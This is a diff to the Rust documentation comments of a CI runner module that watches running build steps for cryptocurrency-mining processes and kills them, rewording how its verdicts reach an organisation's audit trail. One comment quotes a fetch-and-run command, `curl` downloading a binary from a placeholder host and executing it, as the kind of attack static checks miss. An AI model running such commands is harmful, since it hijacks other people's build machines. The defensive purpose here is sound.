@@ -1,17 +1,16 @@
 //! Watching a running step for mining software, and killing it.
 //!
-//! Layer 3 of four. The Network Firewall allowlist (layer 1) means a
-//! miner on this fleet cannot reach a pool; the parse-time refusal (layer
-//! 2) answers the author of a workflow that names one. Both are static:
-//! the first is about where packets go, the second about what the file
-//! says. Neither sees `curl -sL https://example.invalid/m -o m && ./m`,
-//! and a job that spends its whole six-hour budget spinning a CPU costs
-//! real money whether or not it ever found a pool.
+//! The server's parse-time refusal answers the author of a workflow that
+//! names a miner. It is static — it is about what the file says — and it
+//! does not see `curl -sL https://example.invalid/m -o m && ./m`. A job
+//! that spends its whole six-hour budget spinning the CPU of somebody's
+//! build machine costs its owner real money whether or not it ever found
+//! a pool, and on a runner the owner's machine is the one at stake.
 //!
 //! So while a step runs, the processes in its group are sampled, and a
-//! miner among them ends the job with a verdict that says so. Layer 4 —
-//! the control plane suspending the organisation on that verdict — is
-//! what actually makes it expensive to try.
+//! miner among them ends the job with a verdict that says so — which the
+//! server records in the organisation's audit trail, so the machine's
+//! owner can see what was tried on it.
 //!
 //! **What is matched, and what deliberately is not.** A process is a
 //! miner if its *program* is one: `comm`, or the basename of `argv[0]`.
@@ -28,7 +27,8 @@
 //! job's group — which is a shell and its children. Nothing is measured:
 //! there is no CPU heuristic here on purpose, because a release build
 //! with `-j8` looks exactly like a miner to one, and a compile flagged
-//! as abuse is a person locked out of their own forge.
+//! as abuse is a person's honest build killed and written into the audit
+//! trail as an attack.
 
 #[cfg(any(target_os = "linux", test))]
 use std::path::Path;
